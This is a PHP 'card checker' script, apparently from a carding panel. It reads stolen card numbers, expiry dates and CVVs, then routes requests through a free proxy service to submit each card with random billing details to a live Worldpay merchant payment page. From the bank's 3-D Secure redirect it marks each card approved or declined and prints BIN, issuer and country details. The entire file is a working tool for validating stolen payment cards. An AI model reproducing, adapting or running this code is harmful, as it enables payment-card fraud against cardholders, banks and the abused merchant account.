<?php

error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cartao = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

//proxy
extract($_GET);
$link = file_get_contents("https://gimmeproxy.com/api/getProxy");
$link2 = json_decode($link);
$link3 = $link2->ip;
$link4 = $link2->port;
$proxy = $link3.":".$link4;


$valor = array('R$ 1,50 ', 'R$ 4,50 ', 'R$ 2,50 ','R$ 1,75 ','R$ 5,75 ','R$ 1,00 ','R$ 2,00','5,00 R$','R$1,20','R$ 2,20 ','R$ 4,20 ','R$ 5,20 ','R$ 0,50 ','R$ 0,20','R$ 0,50 ' );
shuffle($valor);
$debitou = current($valor);



if($explode[0][0] == "4"){
    $tipo = "op-DPChoose-VISA^SSL";
  }
  
  elseif($explode[0][0] == "5"){
    $tipo = "op-DPChoose-ECMC^SSL";
  }


  elseif($explode[0][0] == "3"){
  $tipo = "op-DPChoose-AMEX^SSL";
  }


$random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 8)), 0, 8);
$ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase?instId=116615&testMode=0&cartId=1&currency=GBP&amount=1.00");
      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
            curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($curl, CURLOPT_PROXY, $proxy);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_ENCODING, "gzip");
      curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Content-Type: application/x-www-form-urlencoded'
                                            ));
      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_POST, 0);       
            curl_setopt($ch, CURLOPT_REFERER, '');
      //curl_setopt($ch, CURLOPT_POSTFIELDS, "");
      $a = curl_exec($ch);
     $PaymentID = value($a, '<input type="hidden" name="PaymentID" value="','"');
      

      curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/purchase");
      curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
            curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($curl, CURLOPT_PROXY, $proxy);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_ENCODING, "gzip");
      curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Content-Type: application/x-www-form-urlencoded'
                                            ));
            curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_POST, 0);       
            curl_setopt($ch, CURLOPT_REFERER, '');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "PaymentID=".$PaymentID."&Lang=pt&authCurrency=GBP&op-DPChoose-VISA%5ESSL.x=39&op-DPChoose-VISA%5ESSL.y=21");
      $b = curl_exec($ch);
      
            curl_setopt($ch, CURLOPT_URL, "https://secure.worldpay.com/wcc/card");
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
            curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($curl, CURLOPT_PROXY, $proxy);
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
      curl_setopt($ch, CURLOPT_ENCODING, "gzip");
      curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3', 'Content-Type: application/x-www-form-urlencoded'
                                            ));

      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
            curl_setopt($ch, CURLOPT_VERBOSE, 1);
            curl_setopt($ch, CURLOPT_POST, 0);       
            curl_setopt($ch, CURLOPT_REFERER, '');
      curl_setopt($ch, CURLOPT_POSTFIELDS, "PaymentID=".$PaymentID."&Lang=pt&cardNoInput=".$cartao."&cardNoJS=&cardNoHidden=*oculto*&cardCVV=".$cvv."&cardExp.day=32&cardExp.time=23%3A59%3A59&cardExp.month=".$mes."&cardExp.year=".$ano."&name=".$random."&address1=".$random."&address2=&address3=&town=".$random."&region=&postcode=&country=BR&tel=&fax=&email=".$random."%40GMAIL.COM&op-PMMakePayment.x=10&op-PMMakePayment.y=10");
      $c = curl_exec($ch);


if (strpos($c, 'https://www66.bb.com.br/SecureCodeAuth') || strpos($c, 'auth.bb')) {
 $bin = substr($cartao, 0,6);

preg_match("/$bin.*/",file_get_contents('bins'),$batata);

 $delimitador = explode(';', $batata[0]);

$bandeira = $delimitador[1];
$banco = $delimitador[2];
$level = $delimitador[3];
$pais = $delimitador[4];
$paiscode = $delimitador[5];
$tipo = $delimitador[6];

   echo "<span class='badge badge-success'>★APROVADA</span> <i class='zmdi zmdi-check'></i></font> -> <span class='badge badge-dark'> $cartao|$mes|$ano|$cvv| [ Verifique VBV/MSC ] </span> | <span class='badge badge-primary'> Retorno: CARTÃO APROVADO </span> <span class='badge badge-dark'> Bandeira:$bandeira | $banco  | $level  | $pais  | $paiscode </span> | <span class='badge badge-success'> @PAINELCHECKERS | $debitou </span><br>";
  }
  elseif (strpos($c, 'https://www58.bb.com.br/ThreeDSecureAuth/vbvLogin/') || strpos($c, 'customer.bb')){

preg_match("/$bin.*/",file_get_contents('bins'),$batata);

 $delimitador = explode(';', $batata[0]);

$bandeira = $delimitador[1];
$banco = $delimitador[2];
$level = $delimitador[3];
$pais = $delimitador[4];
$paiscode = $delimitador[5];
$tipo = $delimitador[6];

 echo "<span class='badge badge-danger'>★REPROVADA</span> <i class='zmdi zmdi-close'></i></font> $msg -> <span class='badge badge-dark'> $cartao|$mes|$ano|$cvv| </span> | <span class='badge badge-primary'> Retorno: CARTÃO RECUSADO </span> <span class='badge badge-dark'> Bandeira: $bandeira | $banco  | $level  | $pais  | $paiscode </span> | <span class='badge badge-success'> @PAINELCHECKERS </span><br>";
  }
  
else {
 $bin = substr($cartao, 0,6);

preg_match("/$bin.*/",file_get_contents('bins'),$batata);

 $delimitador = explode(';', $batata[0]);

$bandeira = $delimitador[1];
$banco = $delimitador[2];
$pais = $delimitador[4];
$paiscode = $delimitador[5];
$tipo = $delimitador[6];
      
 echo "<span class='badge badge-danger'>★REPROVADA★</span> <i class='zmdi zmdi-close'></i></font> $msg -> <span class='badge badge-dark'> $cartao|$mes|$ano|$cvv| </font></span> | <span class='badge badge-primary'> Retorno: CARTÃO RECUSADO </span> <span class='badge badge-dark'> Bandeira: $bandeira | $banco  | $level  | $pais  | $paiscode </span> | <span class='badge badge-success'> @PAINELCHECKERS </span><br>";
  }
    
curl_close($ch);
ob_flush();
?>
